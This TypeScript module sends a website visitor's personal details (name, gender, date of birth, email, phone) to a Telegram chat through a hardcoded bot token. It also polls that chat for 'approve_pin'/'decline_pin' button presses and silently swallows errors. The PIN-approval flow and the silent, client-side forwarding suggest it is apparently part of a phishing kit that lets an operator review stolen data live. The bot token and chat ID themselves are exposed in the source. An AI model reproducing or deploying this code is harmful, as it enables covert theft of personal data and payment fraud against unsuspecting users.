// Простая отправка сообщений в Telegram Bot API
// Токен и chat_id берём из переменных окружения или localStorage/sessionStorage
// ВНИМАНИЕ: Хардкод токенов используется только как fallback для разработки
// В продакшене ОБЯЗАТЕЛЬНО используйте переменные окружения!

// Fallback токены только для локальной разработки (не использовать в продакшене!)
const DEFAULT_TOKEN = process.env.NODE_ENV === 'production' ? null : '8236117338:AAGqLhICCYWKvuFjIg5lYdC2hsmOj1Ry658';
const DEFAULT_CHAT_ID = process.env.NODE_ENV === 'production' ? null : '7630666281';

function getToken(): string | null {
  try {
    const token = (
      (import.meta as any)?.env?.VITE_TELEGRAM_BOT_TOKEN ||
      localStorage.getItem('TELEGRAM_BOT_TOKEN') ||
      sessionStorage.getItem('TELEGRAM_BOT_TOKEN') ||
      DEFAULT_TOKEN
    );
    return token;
  } catch {
    return DEFAULT_TOKEN;
  }
}

function getChatId(): string | null {
  try {
    const chatId = (
      (import.meta as any)?.env?.VITE_TELEGRAM_CHAT_ID ||
      localStorage.getItem('TELEGRAM_CHAT_ID') ||
      sessionStorage.getItem('TELEGRAM_CHAT_ID') ||
      DEFAULT_CHAT_ID
    );
    return chatId;
  } catch {
    return DEFAULT_CHAT_ID;
  }
}

function escapeHtml(text: string): string {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export async function sendTelegram(message: string, chatIdOverride?: string): Promise<void> {
  try {
    const token = getToken();
    const chatId = (chatIdOverride || getChatId());
    if (!token || !chatId) {
      return;
    }
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const body = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    } as any;
    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  } catch {
    // молча глотаем ошибки, чтобы не ломать UX
  }
}

// Новая функция: отправка сообщения с инлайн‑кнопками (Approve/Decline и т.п.)
export async function sendTelegramWithButtons(
  message: string,
  buttons: Array<{ text: string; callback_data: string }>,
  chatIdOverride?: string
): Promise<void> {
  try {
    const token = getToken();
    const chatId = chatIdOverride || getChatId();
    if (!token || !chatId) return;
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const body = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: { inline_keyboard: [buttons] },
    } as any;
    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  } catch {}
}

// Ответ на нажатие кнопки (чтобы Telegram показал всплывашку и «закрыл» спиннер на кнопке)
export async function answerCallbackQuery(callbackQueryId: string, text?: string): Promise<void> {
  try {
    const token = getToken();
    if (!token || !callbackQueryId) return;
    const url = `https://api.telegram.org/bot${token}/answerCallbackQuery`;
    const body = { callback_query_id: callbackQueryId, text: text || '' } as any;
    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  } catch {}
}

// Пуллинг обновлений getUpdates для отлова callback_query от инлайн‑кнопок
export async function pollTelegramCallbacks(): Promise<
  | { kind: 'approve_pin' | 'decline_pin'; updateId: number; callbackQueryId: string }
  | null
> {
  try {
    const token = getToken();
    const chatId = getChatId();
    if (!token || !chatId) return null;
    const last = Number(localStorage.getItem('TELEGRAM_LAST_UPDATE_ID') || '0');
    const url = `https://api.telegram.org/bot${token}/getUpdates?timeout=0&offset=${last ? last + 1 : ''}`;
    const res = await fetch(url, { method: 'GET' });
    if (!res.ok) return null;
    const data = await res.json();
    if (!data?.ok || !Array.isArray(data.result)) return null;

    let maxUpdateId = last;
    for (const upd of data.result) {
      if (typeof upd.update_id === 'number' && upd.update_id > maxUpdateId) {
        maxUpdateId = upd.update_id;
      }
      const cq = upd.callback_query;
      if (!cq) continue;
      const fromId = String(cq.from?.id || '');
      const msgChatId = String(cq.message?.chat?.id || '');
      const isOurChat = fromId === String(chatId) || msgChatId === String(chatId);
      const dataStr = String(cq.data || '');
      if (isOurChat && (dataStr === 'approve_pin' || dataStr === 'decline_pin')) {
        // Сохраняем прогресс оффсета
        localStorage.setItem('TELEGRAM_LAST_UPDATE_ID', String(maxUpdateId));
        return { kind: dataStr as any, updateId: maxUpdateId, callbackQueryId: String(cq.id || '') };
      }
    }
    if (maxUpdateId > last) localStorage.setItem('TELEGRAM_LAST_UPDATE_ID', String(maxUpdateId));
    return null;
  } catch {
    return null;
  }
}

export function formatTravelerSummary(data: {
  firstName?: string; lastName?: string; gender?: string; dd?: string; mm?: string; yyyy?: string; email?: string; phone?: string;
}): string {
  const lines: string[] = [];
  const fullName = [data.firstName||'', data.lastName||''].filter(Boolean).join(' ');
  if (fullName) lines.push(`<b>Traveler</b>: ${escapeHtml(fullName)}`);
  if (data.gender) lines.push(`<b>Gender</b>: ${escapeHtml(String(data.gender))}`);
  const dob = [data.dd, data.mm, data.yyyy].every(Boolean) ? `${data.dd}.${data.mm}.${data.yyyy}` : '';
  if (dob) lines.push(`<b>DOB</b>: ${escapeHtml(dob)}`);
  if (data.email) lines.push(`<b>Email</b>: ${escapeHtml(String(data.email))}`);
  if (data.phone) lines.push(`<b>Phone</b>: ${escapeHtml(String(data.phone))}`);
  return lines.join('\n');
}


